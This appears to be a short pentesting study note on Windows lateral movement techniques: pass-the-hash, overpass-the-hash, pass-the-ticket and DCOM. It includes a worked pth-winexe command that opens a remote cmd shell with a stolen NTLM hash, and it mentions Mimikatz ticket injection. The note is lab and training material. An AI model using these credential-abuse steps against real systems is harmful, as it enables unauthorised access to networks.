# Lateral movement

## Pass the hash

PTH only works for NTLM authentication, not for Kerberos authentication.

Tools: PsExec (Metasploit), [https://github.com/byt3bl33d3r/pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) or [ https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)



Pth-winexe

```
kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
eb3b9f05c425e //10.11.0.22 cmd
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
Microsoft Windows [Version 10.0.16299.309]
(c) 2017 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```

## Overpass the Hash

NTLM to --> Kerberos TGT ticket

With overpass the hash,673 we can “over” abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user.



## Pass the ticket

In the previous section, we used the overpass the hash technique (along with the captured NTLM hash) to acquire a Kerberos TGT, allowing us to authenticate using Kerberos. We can only use the TGT on the machine it was created for, but the TGS potentially offers more flexibility. The Pass the Ticket attack takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service. In addition, if the service tickets belong to the current user, then no administrative privileges are required.

Mimikatz can craft a silver ticket and inject it straight into memory through the (somewhat misleading) kerberos::golden676 command. We will explain this apparent misnaming later in the module.

## Distributed Component Object Model (DCOM)

{% hint style="info" %}
There are two other well-known lateral movement techniques worth mentioning: abusing Windows Management Instrumentation680 and a technique known as PowerShell Remoting.
{% endhint %}

Takes advantage of Office.
